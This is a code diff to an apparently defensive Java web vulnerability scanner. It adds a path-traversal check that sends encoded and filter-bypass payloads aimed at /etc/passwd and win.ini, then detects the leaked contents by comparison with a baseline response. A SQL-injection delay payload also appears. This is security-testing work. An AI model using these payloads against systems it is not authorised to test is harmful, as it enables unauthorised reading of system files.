@@ -79,6 +79,30 @@ final class ActiveTestEngine {
             "'; WAITFOR DELAY '0:0:5'-- -"); // MSSQL
     private static final int SQLI_TIME_DELAY_SECONDS = 5;
 
+    // Path traversal / LFI: read a well-known OS file through the parameter, across depth, separator,
+    // and encoding variants that defeat naive filters. A hit is confirmed only when a file's canary
+    // appears in the payload response but NOT in the baseline (so a page that always mentions "root:"
+    // or "[fonts]" is never mistaken for a read). Distinctive, low-false-positive target files only.
+    private static final List<String> PATH_TRAVERSAL_PAYLOADS = List.of(
+            "../../../../../../etc/passwd",              // Unix, plain, deep
+            "../../../etc/passwd",                        // Unix, plain, shallow
+            "/etc/passwd",                                 // Unix, absolute (no traversal needed)
+            "....//....//....//....//etc/passwd",         // filter-bypass: doubled "..//"
+            "..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",   // URL-encoded slash
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", // fully URL-encoded ../
+            "..%252f..%252f..%252f..%252fetc/passwd",     // double-encoded slash
+            "..\\..\\..\\..\\..\\..\\windows\\win.ini",   // Windows, plain
+            "....\\\\....\\\\....\\\\windows\\win.ini",    // Windows, doubled backslash
+            "..%5c..%5c..%5c..%5cwindows%5cwin.ini",      // Windows, encoded backslash
+            "C:\\windows\\win.ini");                       // Windows, absolute
+
+    // High-signal file canaries: a passwd line pins root to UID:GID 0:0; win.ini carries fixed section
+    // markers. Both are far too specific to appear in an ordinary application response by coincidence.
+    private static final List<Map.Entry<Pattern, String>> PATH_TRAVERSAL_CANARIES = List.of(
+            Map.entry(Pattern.compile("root:[^:\\r\\n]{0,64}:0:0:"), "/etc/passwd contents (Unix)"),
+            Map.entry(Pattern.compile("(?i)(\\[fonts\\]|\\[extensions\\]|for 16-bit app support)"),
+                    "win.ini contents (Windows)"));
+
     // CORS: crafted attacker-controlled Origin headers targeting the specific validation bugs real
     // apps ship — naive contains/startsWith/endsWith checks, missing dot-boundary requirements, and
     // scheme-blind comparisons — not just whatever Origin happened to appear in observed traffic.
@@ -142,6 +166,7 @@ final class ActiveTestEngine {
                 if (!budget.exhausted()) testOpenRedirect(base, parameter, findings);
                 if (!budget.exhausted()) testCrlf(base, parameter, findings);
                 if (!budget.exhausted()) testSqli(base, parameter, findings);
+                if (!budget.exhausted()) testPathTraversal(base, parameter, findings);
             }
             if (!budget.exhausted()) testHostHeaderInjection(base, findings);
             if (!budget.exhausted()) testCors(base, findings);
@@ -295,6 +320,32 @@ final class ActiveTestEngine {
                 out.add(new ActiveFinding("HIGH", "SQLi", parameter.name(),
                         "Time-based blind: response time increased by ~" + SQLI_TIME_DELAY_SECONDS
                                 + "s in response to payload " + payload, true, base.url()));
+                break;
+            }
+        }
+        return budgetUsed() - before;
+    }
+
+    /**
+     * Path traversal / LFI: reads a well-known OS file through {@code parameter}. Sends a baseline with
+     * the parameter's own value first, then each traversal payload, and reports HIGH only when a target
+     * file's canary appears in a payload response but was absent from the baseline — so a page that
+     * legitimately contains {@code root:} or {@code [fonts]} never triggers a false positive.
+     */
+    private int testPathTraversal(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
+        int before = budgetUsed();
+        HttpResponse baseline = sendMutated(base, parameter, parameter.value());
+        if (baseline == null || budgetExhausted()) return budgetUsed() - before;
+        String baselineBody = baseline.bodyToString();
+        for (String payload : PATH_TRAVERSAL_PAYLOADS) {
+            if (budgetExhausted()) break;
+            HttpResponse response = sendMutated(base, parameter, payload);
+            if (response == null) continue;
+            Optional<String> hit = detectPathTraversal(response.bodyToString(), baselineBody);
+            if (hit.isPresent()) {
+                out.add(new ActiveFinding("HIGH", "PathTraversal", parameter.name(),
+                        "Traversal payload returned " + hit.get() + " that was absent from the baseline "
+                                + "response (payload: " + payload + ")", true, base.url()));
                 break;
             }
         }
@@ -480,6 +531,23 @@ final class ActiveTestEngine {
     }
 
     // ---- pure detection cores (unit-tested) ----
+
+    /**
+     * Returns the leaked file's label if a path-traversal canary appears in {@code body} but not in
+     * {@code baselineBody}, else empty. Baseline-differencing is what keeps this specific: a canary
+     * present in the untampered response is application content, not a file read, and never reported.
+     */
+    static Optional<String> detectPathTraversal(String body, String baselineBody) {
+        if (body == null || body.isEmpty()) return Optional.empty();
+        String baseline = baselineBody == null ? "" : baselineBody;
+        for (Map.Entry<Pattern, String> canary : PATH_TRAVERSAL_CANARIES) {
+            Pattern pattern = canary.getKey();
+            if (pattern.matcher(body).find() && !pattern.matcher(baseline).find()) {
+                return Optional.of(canary.getValue());
+            }
+        }
+        return Optional.empty();
+    }
 
     /** Returns the template engine family if the arithmetic marker evaluated, else empty. */
     static Optional<String> detectSstiEval(String body, String payload) {
